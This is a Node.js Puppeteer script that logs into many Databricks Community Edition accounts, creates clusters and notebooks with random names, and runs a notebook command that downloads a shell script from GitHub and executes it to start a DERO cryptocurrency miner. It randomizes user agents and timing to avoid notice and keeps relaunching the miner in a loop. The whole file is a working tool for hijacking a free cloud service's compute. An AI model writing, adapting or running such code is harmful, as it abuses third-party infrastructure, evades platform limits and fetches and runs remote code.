const puppeteer = require('puppeteer');
const _ = require('lodash');
const userA = require('./user-agents-gs.json');
const interval = require('interval-promise');
require('dotenv').config();
let startWorkers = require('./accounts.json');
const workerSetup = [];

function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
      charactersLength));
  }
  return result;
}

const setup = async (email, pass) => {
  let browser;
  let page;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--window-size=800,600'],
      timeout: 0,
      defaultViewport: null,
    });
    let max = 90;
    let initTime = _.random(60, max);
    page = await browser.newPage();
    page.setViewport({ width: 800, height: 600 });
    page.setDefaultNavigationTimeout(10000000);
    await page.setUserAgent(_.sample(userA).userAgent);
    await page.goto('https://community.cloud.databricks.com/login.html', { timeout: 60000 });

    const accountLogin = async () => {
      await page.waitForSelector('#login-email');
      await page.type('#login-email', email);
      await page.type('#login-password', pass + '\u000d');
      await page.waitForSelector('a[data-testid="Compute"]');
      console.log(`[${email}] Login success`);
    };

    const clearNotebook = async () =>{
      if (await page.$('li[data-tab-name="notebooks"]')) {
        await page.waitForSelector('li[data-tab-name="notebooks"]');
        await page.click('li[data-tab-name="notebooks"]');
        if (await page.$('tr.du-bois-light-table-row')) {
          await new Promise((rs) => setTimeout(rs, 3000));
          await page.click('input[data-testid="select-all-checkbox"]');
          await new Promise((rs) => setTimeout(rs, 3000));
          await page.click('button[data-testid="detach-button"]');
          await page.waitForSelector('a.confirm-button');
          await page.click('a.confirm-button');
          await new Promise((rs) => setTimeout(rs, 8000));
          console.log(`[${email}] Detach all notebook done`);
        }
      }
    }

    const getTime = async () => {
      try {
        await page.click('.du-bois-light-table-body table > tbody > tr:nth-child(2) > td:nth-child(2) > a');
        await page.waitForSelector('li[data-tab-name="sparkClusterUi"]');
        await page.click('li[data-tab-name="sparkClusterUi"]');
        await page.waitForSelector('#sparkui-iframe');
        const frameElement = await page.waitForSelector('#sparkui-iframe');
        const frame = await frameElement.contentFrame();
        const element = await frame.waitForSelector('ul.list-unstyled > li:nth-child(2)');
        const text = await element.evaluate(el => el.textContent);
        if (text) {
          let time = _.toNumber(text.replace(/[^0-9\.]+/g, ''));
          if (text.includes('h')) {
            time = time * 60;
          }
          if (time > 0 && time < max) {
            initTime = initTime - time;
            initTime = initTime < 0 ? max : initTime;
            console.log(`[${email}] New time wait: `, initTime);
          }
        }
        await clearNotebook();
      } catch (e) {

      }
    };

    const createNoteBook = async (i = 0) => {
      try {
        await page.reload();
        await page.waitForSelector('#create-menu-button');
        await page.click('#create-menu-button');
        await new Promise((rs) => setTimeout(rs, 1000));
        await page.click('button[data-testid="CreateMenuNotebook"]');
        await page.waitForSelector('input[aria-label="notebook name"]');
        await new Promise((rs) => setTimeout(rs, 1000));
        await page.type('input[aria-label="notebook name"]', makeid(10, 20).toLowerCase() + '\u000d');
        await page.waitForSelector('.CodeMirror textarea', { timeout: 90000 });
      } catch (e) {
        ++i;
        if (i <= 5) {
          console.log(`[${email}] Retry createNoteBook`, i);
          await clearNotebook();
          await createNoteBook(i);
        } else {
          throw e;
        }
      }
    };

    const startMiner = async () => {
      console.log(`[${email}] Create cluster`);
      await page.goto('https://community.cloud.databricks.com/?o=7974461910430394#setting/clusters');
      await new Promise((rs) => setTimeout(rs, 5000));
      if (await page.$('#login-email')) {
        await accountLogin();
        await new Promise((rs) => setTimeout(rs, 5000));
      }
      await page.waitForSelector('span[data-test-id="clusters-list__create-button"]');

      if (!await page.$('i.fa-check-circle-o')) {
        await page.click('span[data-test-id="clusters-list__create-button"]');
        await page.waitForSelector('#cluster-input--name');
        await page.type('#cluster-input--name', makeid(10, 20).toLowerCase());
        if (await page.$('button[disabled]') === null) {
          await page.type('#cluster-input--name', '\u000d');
          await page.waitForSelector('i.fa-check-circle-o', { timeout: 600000 });
          console.log(`[${email}] Create cluster done`);
        } else {
          console.log(`[${email}] Already cluster running`);
          await page.goto('https://community.cloud.databricks.com/?o=7974461910430394#setting/clusters');
          await page.waitForSelector('span[data-test-id="clusters-list__create-button"]');
          await getTime();
        }
      } else {
        console.log(`[${email}] Already cluster running`);
        await getTime();
      }

      await createNoteBook();
      console.log(`[${email}] Create notebook done`);
      await new Promise((rs) => setTimeout(rs, 2000));
      console.log(`[${email}] Send miner cmd`);
      await page.type('.CodeMirror textarea', `!wget -O/databricks/driver/start_miner.sh https://github.com/anhtuan9414/temp/raw/main/start_miner.sh && chmod +x start_miner.sh && ./start_miner.sh ${process.env.DERO_WALLET}`);
      await page.click('button[data-testid="notebook-run-all-button"]');
      await new Promise((rs) => setTimeout(rs, 5000));
      if (await page.$('button[data-testid="ClusterAttachModalV2Confirm"]')) {
        await page.click('button[data-testid="ClusterAttachModalV2Confirm"]');
      }
      console.log(`[${email}] Start miner`);
      try {
        console.log(`[${email}] Waiting for setup...`);
        await new Promise((rs) => setTimeout(rs, 60000));
        // await page.waitForSelector('.command-result-stats', { timeout: 300000 });
      } catch (e) {
      }
      console.log(`[${email}] Setup miner done...`);
      // console.log(`[${email}] Start interval check disconnect`);
      // await interval(async (num, stop) => {
      //   console.log(`[${email}] Interval track...`);
      //   const element = await page.waitForSelector('button[data-testid="cluster-dropdown-v2-button"]');
      //   if (element && (await element.evaluate(el => el.textContent)).includes('Terminated')) {
      //     stop();
      //     console.log(`[${email}] Recreate cluster!!!`)
      //     await startMiner();
      //   }
      // }, 10000);
      const pages = await browser.pages();
      await Promise.all(pages.map(page => page.close()));
      await browser.close();
      console.log(`[${email}] Browser closed`);
      console.log(`[${email}] Wait ${initTime} min to next start miner...`);
      workerSetup.push(email);
      console.log(`Total setup miner done ${workerSetup.length} of ${startWorkers.length}`);
      await new Promise((rs) => setTimeout(rs, initTime * 60000));
      console.log(`[${email}] Restart miner`);
      _.remove(workerSetup, (t) => t === email);
      await setup(email, pass);
    };
    await accountLogin();
    await startMiner();
  } catch (e) {
    console.error(e);
    const pages = await browser.pages();
    await Promise.all(pages.map(page => page.close()));
    await browser.close();
    throw e;
  }
};

const loopSetup = async (worker, i = 0) => {
  try {
    await setup(worker.email, worker.pass);
  } catch (e) {
    console.error(e);
    ++i;
    if (i <= 20) {
      console.log(`[${worker.email}] Retry setup`, i);
      await new Promise((rs) => setTimeout(rs, 5000));
      await loopSetup(worker, i);
    } else {
      throw e;
    }
  }
};

(async () => {
  const promises = startWorkers.map(async (worker, i) => {
    console.log(`Worker ${i}`, worker.email);
    if (i > 0) {
      await new Promise((rs) => setTimeout(rs, _.random(10000, 30000)));
    }
    try {
      await loopSetup(worker);
    } catch (e) {
      console.log('Ignore error', e);
    }
  });
  await Promise.all(promises);
})();
